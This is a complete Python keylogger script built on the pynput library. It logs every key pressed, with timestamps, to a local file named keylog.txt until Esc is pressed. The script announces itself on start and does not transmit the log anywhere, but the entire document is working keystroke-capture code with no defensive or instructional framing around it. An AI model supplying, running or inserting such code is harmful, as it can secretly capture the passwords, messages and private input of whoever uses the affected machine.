import pynput
from pynput.keyboard import Key, Listener
import logging

# Configure logging to a file
log_dir = ""  # Current directory
logging.basicConfig(filename=(log_dir + "keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(str(key.char))
    except AttributeError:
        logging.info(str(key))

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

print("Keylogger started. Press 'Esc' to stop.")

# Collect events until released
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

